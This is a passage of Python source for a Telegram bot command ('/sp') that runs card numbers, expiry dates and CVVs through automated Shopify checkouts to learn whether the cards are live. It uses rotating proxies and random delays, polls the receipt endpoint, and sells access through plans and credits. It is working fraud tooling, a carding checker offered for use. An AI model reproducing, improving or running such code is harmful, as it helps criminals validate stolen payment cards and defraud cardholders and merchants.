            
            elif typename == 'SubmitRejected':
                errors = data.get('errors', [])
                for err in errors:
                    code = err.get('code', '')
                    if code:
                        return False, f"DECLINED - {code}"
                return False, "DECLINED - Payment rejected"
            
            elif typename == 'Throttled':
                poll_after = data.get('pollAfter', 2000)
                self.queue_token = data.get('queueToken', self.queue_token)
                await asyncio.sleep(poll_after / 1000.0)
                return await self.submit_payment(payment_session_id)
            
            else:
                return False, f"DECLINED - {typename}"
                
        except Exception as e:
            return False, f"DECLINED - {str(e)[:50]}"

    async def poll_receipt(self, receipt_id):
        """Step 5: Poll for receipt"""
        self.step(5, "POLL RECEIPT", f"Polling receipt: {receipt_id}")
        
        graphql_url = f"{self.base_url}/checkouts/unstable/graphql"
        
        graphql_headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f"{self.base_url}/checkouts/cn/{self.checkout_token}",
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': self.headers['user-agent'],
            'x-checkout-one-session-token': self.session_token,
            'x-checkout-web-build-id': self.build_id
        }
        
        POLL_QUERY = '''query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id token}...on ProcessingReceipt{id pollDelay}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{url}}}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}'''
        
        for attempt in range(15):
            try:
                poll_payload = {
                    "query": POLL_QUERY,
                    "operationName": "PollForReceipt",
                    "variables": {
                        "receiptId": receipt_id,
                        "sessionToken": self.session_token
                    }
                }
                
                resp = await self.client.post(graphql_url, json=poll_payload, headers=graphql_headers, timeout=30)
                
                if resp.status_code != 200:
                    await asyncio.sleep(2)
                    continue
                
                result = resp.json()
                receipt = result.get('data', {}).get('receipt', {})
                typename = receipt.get('__typename', '')
                
                if typename == 'ProcessedReceipt':
                    return True, "ORDER_PLACED"
                
                elif typename == 'ActionRequiredReceipt':
                    return True, "3DS_REQUIRED"
                
                elif typename == 'FailedReceipt':
                    error = receipt.get('processingError', {})
                    code = error.get('code', 'UNKNOWN')
                    return False, f"DECLINED - {code}"
                
                elif typename == 'ProcessingReceipt':
                    delay = receipt.get('pollDelay', 3000)
                    await asyncio.sleep(delay / 1000.0)
                    continue
                
                else:
                    await asyncio.sleep(2)
                    continue
                    
            except Exception as e:
                await asyncio.sleep(2)
                continue
        
        return False, "DECLINED - Polling timeout"

    async def execute_checkout(self, cc, mes, ano, cvv):
        """Main checkout execution - DIRECT CHECKOUT ONLY"""
        try:
            # Step 0: Get proxy
            self.step(0, "GET PROXY", "Getting proxy")
            
            if PROXY_SYSTEM_AVAILABLE:
                self.proxy_url = get_proxy_for_user(self.user_id, "random")
                if not self.proxy_url:
                    self.logger.error_log("NO_PROXY", "No working proxies available")
                    return False, "NO_PROXY_AVAILABLE"
                
                self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
                self.proxy_status = "Live ⚡️"
                self.logger.data_extracted("Proxy", f"{self.proxy_url[:30]}...")
            else:
                self.client = httpx.AsyncClient(timeout=30)
                self.proxy_status = "No Proxy"
            
            # Step 1: Direct checkout access
            success, result = await self.direct_checkout_access()
            if not success:
                return False, result
            await self.random_delay(0.1, 0.2)
            
            # Step 2: Extract metadata
            if not await self.extract_checkout_metadata():
                return False, "Failed to extract checkout metadata"
            await self.random_delay(0.1, 0.2)
            
            # Step 3: Create PCI session
            success, payment_id = await self.create_pci_session(cc, mes, ano, cvv)
            if not success:
                return False, payment_id
            await self.random_delay(0.1, 0.2)
            
            # Step 4: Submit payment
            success, result = await self.submit_payment(payment_id)
            if not success:
                return False, result
            
            if result == "3DS_REQUIRED":
                return True, "APPROVED - 3DS Required"
            
            receipt_id = result
            
            # Step 5: Poll for receipt
            success, result = await self.poll_receipt(receipt_id)
            
            return success, result
            
        except Exception as e:
            self.logger.error_log("UNKNOWN", str(e))
            return False, f"Checkout error: {str(e)[:50]}"
        finally:
            if self.client:
                await self.client.aclose()


# ========== MAIN CHECKER CLASS ==========
class ShopifyRouteChargeChecker:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.logger = ShopifyLogger(user_id)
        self.proxy_status = "Dead 🚫"

    async def check_card(self, card_details, username, user_data):
        start_time = time.time()
        self.logger = ShopifyLogger(self.user_id)
        self.logger.start_check(card_details)

        try:
            parsed = parse_card_input(card_details)
            if not parsed:
                elapsed_time = time.time() - start_time
                return format_shopify_response("", "", "", "", "Invalid card format", elapsed_time, username, user_data, self.proxy_status)

            cc, mes, ano, cvv = parsed

            if not cc.isdigit() or len(cc) < 15:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data, self.proxy_status)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data, self.proxy_status)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data, self.proxy_status)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data, self.proxy_status)

            self.logger.card_details_log(cc, mes, ano, cvv)

            checker = RouteChargeCheckout(self.user_id)
            success, result = await checker.execute_checkout(cc, mes, ano, cvv)
            
            self.proxy_status = checker.proxy_status
            elapsed_time = time.time() - start_time

            self.logger.complete_result(success, "APPROVED" if success else "DECLINED", result, elapsed_time)
            return format_shopify_response(cc, mes, ano, cvv, result, elapsed_time, username, user_data, self.proxy_status)

        except Exception as e:
            elapsed_time = time.time() - start_time
            return format_shopify_response("", "", "", "", f"Error: {str(e)[:50]}", elapsed_time, username, user_data, self.proxy_status)


# ========== COMMAND HANDLER ==========
@Client.on_message(filters.command(["sp", ".sp", "$sp"]))
@auth_and_free_restricted
async def handle_shopify_route_charge(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        can_use, wait_time = check_cooldown(user_id, "sp")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/sp</code>
🠪 <b>Usage</b>: <code>/sp cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/sp 4111111111111111|12|2030|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Shopify Charge</code>""")
            return

        full_text = message.text
        command_parts = full_text.split(maxsplit=1)
        if len(command_parts) < 2:
            await message.reply("Please provide card details")
            return
        
        card_input = command_parts[1].strip()

        parsed = parse_card_input(card_input)
        if not parsed:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Could not extract card details. Please use format like:
🠪 <b>Format 1</b>: <code>cc|mm|yy|cvv</code>
━━━━━━━━━━━━━""")
            return

        cc, mes, ano, cvv = parsed

        processing_msg = await message.reply(
            f"""
<b>[#Shopify Charge] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 1.00$</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Initiating...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Processing... Please wait.</b>
"""
        )

        checker = ShopifyRouteChargeChecker(user_id)

        if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
            try:
                result = await charge_processor.execute_charge_command(
                    user_id,
                    checker.check_card,
                    card_input,
                    username,
                    user_data,
                    credits_needed=2,
                    command_name="sp",
                    gateway_name="Shopify Charge"
                )

                if isinstance(result, tuple) and len(result) == 3:
                    success, result_text, credits_deducted = result
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                elif isinstance(result, str):
                    await processing_msg.edit_text(result, disable_web_page_preview=True)
                else:
                    result_text = await checker.check_card(card_input, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)

            except Exception as e:
                print(f"❌ Charge processor error: {str(e)}")
                try:
                    result_text = await checker.check_card(card_input, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                except Exception as inner_e:
                    await processing_msg.edit_text(
                        f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(inner_e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                    )
        else:
            try:
                result_text = await checker.check_card(card_input, username, user_data)
                await processing_msg.edit_text(result_text, disable_web_page_preview=True)
            except Exception as e:
                await processing_msg.edit_text(
                    f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                )

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
